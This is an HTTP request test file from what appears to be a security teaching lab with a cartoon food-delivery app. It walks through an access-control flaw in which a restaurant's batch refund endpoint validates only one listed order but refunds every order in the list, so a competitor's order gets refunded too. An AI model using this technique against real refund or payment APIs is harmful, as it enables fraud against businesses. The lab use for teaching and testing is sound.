# @import ../common/setup.http
@host = {{base_host}}/v404

# EXPLOIT: Plankton batch-refunds orders from BOTH restaurants by mixing
# one legitimate Chum Bucket order with a victim's Krusty Krab order.

### Setup: Reset DB and seed both users' balances
{{
  await resetDB("v404");
  await seedBalance("v404", "spongebob@krusty-krab.sea", 50);
  await seedBalance("v404", "patrick@bikinibottom.sea", 50);
}}

### Get menu items
GET /menu

{{
  exports.krabby_patty = response.parsedBody.find(i => i.name == "Krabby Patty");
  exports.chum_burger = response.parsedBody.find(i => i.name == "Chum Burger");
}}


# --- SpongeBob places an order at Krusty Krab (the VICTIM order) ---

### SpongeBob creates cart at Krusty Krab
POST /cart?restaurant_id=1
Authorization: {{spongebob_auth}}

@spongebob_cart_id = {{response.parsedBody.cart_id}}


### SpongeBob adds item to cart
POST /cart/{{spongebob_cart_id}}/items
Authorization: {{spongebob_auth}}
Content-Type: application/json

{ "item_id": {{krabby_patty.id}} }


### SpongeBob checks out
POST /cart/{{spongebob_cart_id}}/checkout
Authorization: {{spongebob_auth}}
Content-Type: application/json

{
  "tip": 1,
  "delivery_address": "Pineapple House"
}

@krusty_krab_order_id = {{response.parsedBody.order_id}}

{{
  console.info("SpongeBob's Krusty Krab order: #" + response.parsedBody.order_id);
}}


# --- Patrick places an order at Chum Bucket (Plankton's legitimate order) ---

### Patrick creates cart at Chum Bucket
POST /cart?restaurant_id=2
Authorization: {{patrick_auth}}

@patrick_cart_id = {{response.parsedBody.cart_id}}

### Patrick adds item to cart
POST /cart/{{patrick_cart_id}}/items
Authorization: {{patrick_auth}}
Content-Type: application/json

{ "item_id": {{chum_burger.id}} }


### Patrick checks out
POST /cart/{{patrick_cart_id}}/checkout
Authorization: {{patrick_auth}}
Content-Type: application/json

{
  "tip": 1,
  "delivery_address": "Under a Rock"
}

@chum_bucket_order_id = {{response.parsedBody.order_id}}

{{
  console.info("Patrick's Chum Bucket order: #" + response.parsedBody.order_id);
}}


# --- Both restaurants deliver their orders ---

### Krusty Krab marks SpongeBob's order as delivered
PATCH /orders/{{krusty_krab_order_id}}/status
X-API-Key: {{krabs_api_key}}
Content-Type: application/x-www-form-urlencoded

status=delivered

### Chum Bucket marks Patrick's order as delivered
PATCH /orders/{{chum_bucket_order_id}}/status
X-API-Key: {{chum_bucket_api_key}}
Content-Type: application/x-www-form-urlencoded

status=delivered


# --- EXPLOIT: Plankton batch-refunds orders from BOTH restaurants! ---

### EXPLOIT: Plankton submits batch refund mixing his order with competitor's
# The validation checks: "Does ANY order belong to Chum Bucket?"
# Patrick's order matches, so the check passes.
# But the handler refunds ALL orders - including SpongeBob's Krusty Krab order!
POST /restaurants/2/refunds
X-API-Key: {{chum_bucket_api_key}}
Content-Type: application/json

{
  "order_ids": [{{chum_bucket_order_id}}, {{krusty_krab_order_id}}],
  "reason": "Quality issue"
}

?? status == 200
?? js response.parsedBody.processed_ids.length == 2

{{
  console.info("EXPLOIT SUCCESS: Plankton refunded " + response.parsedBody.processed_ids.length + " orders!");
  console.info("Including Krusty Krab order #" + krusty_krab_order_id + " which belongs to Mr. Krabs!");
}}


### Verify: SpongeBob got refunded (his balance is back to 50)
GET /account/credits
Authorization: {{spongebob_auth}}

?? body balance == 50.00

{{
  console.info("SpongeBob's balance restored to $" + response.parsedBody.balance + " - Plankton hurt Mr. Krabs!");
}}
